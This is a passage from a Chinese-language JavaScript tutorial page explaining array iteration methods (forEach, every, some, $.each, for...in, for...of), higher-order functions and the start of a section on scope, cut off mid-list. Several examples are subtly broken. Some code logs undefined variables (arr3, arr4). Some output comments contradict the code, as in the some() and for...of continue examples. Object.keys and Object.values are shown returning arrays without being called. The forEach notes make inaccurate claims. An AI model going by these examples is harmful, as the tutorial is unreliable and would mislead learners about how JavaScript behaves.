<h3 id="forEach"><a href="#forEach" class="headerlink" title="forEach"></a>forEach</h3>  <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [</span><br><span class="line">  &#123;</span><br><span class="line">    id: <span class="number">1</span>,</span><br><span class="line">    num: <span class="number">10</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    id: <span class="number">2</span>,</span><br><span class="line">    num: <span class="number">20</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    id: <span class="number">3</span>,</span><br><span class="line">    num: <span class="number">30</span>,</span><br><span class="line">  &#125;</span><br><span class="line">];</span><br><span class="line"><span class="comment">// forEach()方法用于调用数组的每个元素，并将元素传递给回调函数。</span></span><br><span class="line"><span class="comment">// </span></span><br><span class="line"><span class="comment">// 注意事项：</span></span><br><span class="line"><span class="comment">// 1、原数组会被修改</span></span><br><span class="line"><span class="comment">// 2、会进行空数组检测</span></span><br><span class="line"><span class="comment">// 3、那些已删除或者未初始化的项将被跳过（例如在稀疏数组上，稀疏数组如 new Array(10)）</span></span><br><span class="line"><span class="comment">// 4、如果数组在迭代时被修改了，则其他元素会被跳过。如果迭代时删除第二项，则原本的第三项会补到第二项，此时第三项会被跳过</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 场景1：收集所有的id</span></span><br><span class="line"><span class="keyword">let</span> newArr = [];</span><br><span class="line"><span class="keyword">const</span> arr1 = arr.forEach(<span class="function">(<span class="params">item, index, self</span>) =&gt;</span> &#123;</span><br><span class="line">  newArr.push(item.id); <span class="comment">// 收集value值 [1, 2, 3]</span></span><br><span class="line">  newArr.push(&#123;<span class="attr">id</span>: item.id&#125;); <span class="comment">// 手机键值对 [&#123;id: 1&#125;, &#123;id: 2&#125;, &#123;id: 3&#125;]</span></span><br><span class="line">&#125;);</span><br><span class="line"><span class="built_in">console</span>.log(newArr);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 场景2：将arr每一项中的num乘以2</span></span><br><span class="line">arr.forEach(<span class="function">(<span class="params">item, index, self</span>) =&gt;</span> &#123;</span><br><span class="line">  item.num = item.num * <span class="number">2</span>;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="built_in">console</span>.log(arr); <span class="comment">// [&#123;id:1, num:20&#125;, ...]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 场景3：往arr每一项中新增一个name字段，并赋初始值 小明</span></span><br><span class="line">arr.forEach(<span class="function">(<span class="params">item, index, self</span>) =&gt;</span> &#123;</span><br><span class="line">  item = $.extend(item, &#123;</span><br><span class="line">    name: <span class="string">'小明'</span></span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="built_in">console</span>.log(arr3); <span class="comment">// [&#123;id:1, num:10, name:'小明'&#125;, ...]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 场景4，一步操作，同时满足2和3</span></span><br><span class="line">arr.forEach(<span class="function">(<span class="params">item, index, self</span>) =&gt;</span> &#123;</span><br><span class="line">  item = $.extend(item, &#123;</span><br><span class="line">    num: item.num * <span class="number">2</span>,</span><br><span class="line">    name: <span class="string">'小明'</span></span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="built_in">console</span>.log(arr4); <span class="comment">// [&#123;id:1, num:20, name:'小明'&#125;, ...]</span></span><br></pre></td></tr></table></figure>
<h3 id="every"><a href="#every" class="headerlink" title="every"></a>every</h3>  <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [</span><br><span class="line">  &#123;</span><br><span class="line">    id: <span class="number">1</span>,</span><br><span class="line">    num: <span class="number">10</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    id: <span class="number">2</span>,</span><br><span class="line">    num: <span class="number">20</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    id: <span class="number">3</span>,</span><br><span class="line">    num: <span class="number">30</span>,</span><br><span class="line">  &#125;</span><br><span class="line">];</span><br><span class="line"><span class="comment">// every()方法用于检测数组所有元素是否都符合指定条件</span></span><br><span class="line"><span class="comment">// 如果数组中检测到有一个元素不满足，则整个表达式返回 false ，且剩余的元素不会再进行检测。</span></span><br><span class="line"><span class="comment">// 如果所有元素都满足条件，则返回 true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 场景1：检测arr中是否所有的项的num都为10</span></span><br><span class="line">arr.every(<span class="function">(<span class="params">item, index, self</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> item.num === <span class="number">10</span>;</span><br><span class="line">&#125;); <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 场景2：使用return false 来跳出循环</span></span><br><span class="line">arr.every(<span class="function">(<span class="params">item, index, self</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (item.num &gt; <span class="number">10</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">// 跳出循环</span></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(item.num)<span class="comment">// 10</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<h3 id="some"><a href="#some" class="headerlink" title="some"></a>some</h3>  <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [</span><br><span class="line">  &#123;</span><br><span class="line">    id: <span class="number">1</span>,</span><br><span class="line">    num: <span class="number">10</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    id: <span class="number">2</span>,</span><br><span class="line">    num: <span class="number">20</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    id: <span class="number">3</span>,</span><br><span class="line">    num: <span class="number">30</span>,</span><br><span class="line">  &#125;</span><br><span class="line">];</span><br><span class="line"><span class="comment">// some()方法方法用于检测数组中的元素是否满足指定条件</span></span><br><span class="line"><span class="comment">// 如果有一个元素满足条件，则表达式返回true , 剩余的元素不会再执行检测。</span></span><br><span class="line"><span class="comment">// 如果没有满足条件的元素，则返回false</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 场景1：检测arr中是否所有的项的num都为10</span></span><br><span class="line">arr.some(<span class="function">(<span class="params">item, index, self</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> item.num === <span class="number">10</span>;</span><br><span class="line">&#125;); <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 场景2：使用return true 来跳出循环</span></span><br><span class="line">arr.some(<span class="function">(<span class="params">item, index, self</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (item.num &gt; <span class="number">20</span>) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(item.num); <span class="comment">// 10、20</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>; <span class="comment">// 跳出循环</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<h3 id="each"><a href="#each" class="headerlink" title="$.each"></a>$.each</h3><p>  $.each()是对数组，json和dom结构等的遍历</p>
<ol>
<li><p>遍历list</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">100</span>, <span class="number">200</span>, <span class="number">300</span>];</span><br><span class="line">$.each(arr, (index, item) =&gt; &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(index, item);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 0 100</span></span><br><span class="line"><span class="comment">// 1 200</span></span><br><span class="line"><span class="comment">// 2 300</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>遍历map</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">  a: <span class="number">100</span>,</span><br><span class="line">  b: <span class="number">200</span>,</span><br><span class="line">  c: <span class="number">300</span></span><br><span class="line">&#125;;</span><br><span class="line">$.each(obj, (key, value) =&gt; &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(key, value)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// a 100</span></span><br><span class="line"><span class="comment">// b 200</span></span><br><span class="line"><span class="comment">// c 300</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>遍历list map</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> listMap = [</span><br><span class="line">  &#123;</span><br><span class="line">    id: <span class="number">1</span>,</span><br><span class="line">    name: <span class="string">'小明'</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    id: <span class="number">2</span>,</span><br><span class="line">    name: <span class="string">'小红'</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    id: <span class="number">3</span>,</span><br><span class="line">    name: <span class="string">'小白'</span></span><br><span class="line">  &#125;</span><br><span class="line">];</span><br><span class="line">$.each(listMap, (index, item) =&gt; &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'outer each:'</span>, index, item);</span><br><span class="line">  $.each(item, (key, value) =&gt; &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'inner each:'</span>, key, value);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// outer each: 0 &#123;id: 1, name: "小明"&#125;</span></span><br><span class="line"><span class="comment">// inner each: id 1</span></span><br><span class="line"><span class="comment">// inner each: name 小明</span></span><br><span class="line"><span class="comment">// outer each: 1 &#123;id: 2, name: "小红"&#125;</span></span><br><span class="line"><span class="comment">// inner each: id 2</span></span><br><span class="line"><span class="comment">// inner each: name 小红</span></span><br><span class="line"><span class="comment">// outer each: 2 &#123;id: 3, name: "小白"&#125;</span></span><br><span class="line"><span class="comment">// inner each: id 3</span></span><br><span class="line"><span class="comment">// inner each: name 小白</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>遍历dom</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"aaa"</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">value</span>=<span class="string">"111"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"bbb"</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">value</span>=<span class="string">"222"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"ccc"</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">value</span>=<span class="string">"333"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"ddd"</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">value</span>=<span class="string">"444"</span> /&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$.each($(<span class="string">"[type='hidden']"</span>), (index, element) =&gt; &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(index, element.item, element.value);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 0 aaa 111</span></span><br><span class="line"><span class="comment">// 1 bbb 222</span></span><br><span class="line"><span class="comment">// 2 ccc 333</span></span><br><span class="line"><span class="comment">// 3 ddd 444</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>jquery dom 遍历 </p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(selector).each(<span class="function"><span class="keyword">function</span> (<span class="params">index, element</span>) </span>&#123;&#125;);</span><br></pre></td></tr></table></figure>
<p>这种写法常在遍历 <code>Dom</code> 的时候出现。</p>
</li>
</ol>
<h3 id="for…in"><a href="#for…in" class="headerlink" title="for…in"></a>for…in</h3><p>  for…in 语句用于遍历数组或者对象的属性（对数组或者对象的属性进行循环操作）<br>  for…in 语句取到的是list、string的索引 或 map的key</p>
<ol>
<li><p>遍历list</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> list = [<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>, <span class="number">40</span>, <span class="number">50</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i <span class="keyword">in</span> list) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(i, list[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 0 10</span></span><br><span class="line"><span class="comment">// 1 20</span></span><br><span class="line"><span class="comment">// 2 30</span></span><br><span class="line"><span class="comment">// 3 40</span></span><br><span class="line"><span class="comment">// 4 50</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>遍历string</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> str = <span class="string">'abcde'</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i <span class="keyword">in</span> str) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(i, str[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 0 a</span></span><br><span class="line"><span class="comment">// 1 b</span></span><br><span class="line"><span class="comment">// 2 c</span></span><br><span class="line"><span class="comment">// 3 d</span></span><br><span class="line"><span class="comment">// 4 e</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>遍历map</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> map = &#123;</span><br><span class="line">  a: <span class="number">100</span>,</span><br><span class="line">  b: <span class="number">200</span>,</span><br><span class="line">  c: <span class="number">300</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> map) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(key, map[key]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// a 100</span></span><br><span class="line"><span class="comment">// b 200</span></span><br><span class="line"><span class="comment">// c 300</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>遍历list map</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> listMap = [</span><br><span class="line">  &#123;</span><br><span class="line">    id: <span class="number">1</span>,</span><br><span class="line">    name: <span class="string">'小明'</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    id: <span class="number">2</span>,</span><br><span class="line">    name: <span class="string">'小红'</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    id: <span class="number">3</span>,</span><br><span class="line">    name: <span class="string">'小白'</span></span><br><span class="line">  &#125;</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i <span class="keyword">in</span> listMap) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(i, listMap[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 0 &#123;id: 1, name: "小明"&#125;</span></span><br><span class="line"><span class="comment">// 1 &#123;id: 2, name: "小红"&#125;</span></span><br><span class="line"><span class="comment">// 2 &#123;id: 3, name: "小白"&#125;</span></span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="es6-for…of"><a href="#es6-for…of" class="headerlink" title="es6 for…of"></a>es6 for…of</h3><p>  for…of 语句不能对象使用<br>  for…of 语句取到的是list、string的值或map的value，类似于forEach语句<br>  内部支持break、continue<br>  部署了Symbol.iterator遍历器的都可以使用for…of，如Array、String、Map、Set、NodeList、typeArray等</p>
<ol>
<li><p>遍历list</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> list = [<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>, <span class="number">40</span>, <span class="number">50</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i <span class="keyword">of</span> list) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(i, list[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 10 undefined</span></span><br><span class="line"><span class="comment">// 20 undefined</span></span><br><span class="line"><span class="comment">// 30 undefined</span></span><br><span class="line"><span class="comment">// 40 undefined</span></span><br><span class="line"><span class="comment">// 50 undefined</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>遍历string</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> str = <span class="string">'abcde'</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> value <span class="keyword">of</span> str) &#123;</span><br><span class="line">  <span class="keyword">if</span> (value === <span class="string">'c'</span>) <span class="keyword">break</span>;</span><br><span class="line">  <span class="built_in">console</span>.log(value);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// a</span></span><br><span class="line"><span class="comment">// b</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> str = <span class="string">'abcde'</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> value <span class="keyword">of</span> str) &#123;</span><br><span class="line">  <span class="keyword">if</span> (value === <span class="string">'c'</span>) <span class="keyword">continue</span>;</span><br><span class="line">  <span class="built_in">console</span>.log(value);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// a</span></span><br><span class="line"><span class="comment">// c</span></span><br><span class="line"><span class="comment">// d</span></span><br><span class="line"><span class="comment">// e</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>如何让for…of支持map</p>
<ul>
<li><p>es6 遍历器map set 方法<br>详见<a href="http://es6.ruanyifeng.com/#docs/iterator" target="_blank" rel="noopener">阮一峰 Iterator遍历器</a></p>
</li>
<li><p>转换数组法<br>虽然 for…of 语句不能直接作用在 map 上，但是我们可以使用某些方法将 map 转成数组后再处理，如：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> map = &#123;</span><br><span class="line">  a: <span class="number">100</span>,</span><br><span class="line">  b: <span class="number">200</span>,</span><br><span class="line">  c: <span class="number">300</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Object</span>.keys); <span class="comment">// ['a', 'b', 'c']</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Object</span>.values); <span class="comment">// [100, 200, 300]</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ol>
<hr>
<h2 id="高阶函数"><a href="#高阶函数" class="headerlink" title="高阶函数"></a>高阶函数</h2><p>高阶函数是指至少满足下列条件之一的函数：</p>
<ol>
<li>函数可以作为参数被传递</li>
<li>函数可以作为返回值输出</li>
</ol>
<p>常见的高阶函数：<code>map</code>、<code>filter</code>、<code>reduce</code>、<code>sort</code>、<code>forEach</code>、<code>some</code>、<code>every</code></p>
<hr>
<h2 id="作用域与闭包"><a href="#作用域与闭包" class="headerlink" title="作用域与闭包"></a>作用域与闭包</h2><h3 id="作用域"><a href="#作用域" class="headerlink" title="作用域"></a>作用域</h3><p>作用域是指程序源代码中定义变量的区域，一段程序代码中所用到的变量并不总是有效的，而限定这个变量的可用性的代码范围就是这个变量的作用域。</p>
<p>在JavaScript中使用的作用域是静态作用域（词法作用域），变量的作用域在变量定义时确认，而不是执行时确认。</p>
<p>在JavaScript中，作用域分为全局作用域和函数作用域。<br>  ES5: 全局作用域、函数作用域<br>  ES6: 新增块级作用域</p>
<ul>
<li><p>全局作用域<br>代码在任何地方都可以被访问，window对象的内置对象都拥有全局作用域。</p>
<ul>
<li><p>最外层函数和在最外层函数外面定义的变量拥有全局作用域</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> outVariable = <span class="string">"我是最外层变量"</span>; <span class="comment">// 最外层变量</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">outFun</span>(<span class="params"></span>) </span>&#123; <span class="comment">// 最外层函数</span></span><br><span class="line">  <span class="keyword">var</span> inVariable = <span class="string">"内层变量"</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">innerFun</span>(<span class="params"></span>) </span>&#123; <span class="comment">// 内层函数</span></span><br><span class="line">    <span class="built_in">console</span>.log(inVariable);</span><br><span class="line">  &#125;</span><br><span class="line">  innerFun();</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(outVariable); <span class="comment">// 我是最外层变量</span></span><br><span class="line">outFun(); <span class="comment">// 内层变量</span></span><br><span class="line"><span class="built_in">console</span>.log(inVariable); <span class="comment">// inVariable is not defined</span></span><br><span class="line">innerFun(); <span class="comment">// innerFun is not defined</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>所有末定义直接赋值的变量自动声明为拥有全局作用域</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">outFun2</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  variable = <span class="string">"未定义直接赋值的变量"</span>;</span><br><span class="line">  <span class="keyword">var</span> inVariable2 = <span class="string">"内层变量2"</span>;</span><br><span class="line">&#125;</span><br><span class="line">outFun2(); <span class="comment">// 要先执行这个函数，否则根本不知道里面是啥</span></span><br><span class="line"><span class="built_in">console</span>.log(variable); <span class="comment">// 未定义直接赋值的变量</span></span><br><span class="line"><span class="built_in">console</span>.log(inVariable2); <span class="comment">// inVariable2 is not defined</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>所有 window 对象的属性拥有全局作用域</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.name</span><br><span class="line"><span class="built_in">window</span>.location</span><br><span class="line"><span class="built_in">window</span>.Math</span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>函数作用域<br>在固定的代码片段中才能被访问。</p>
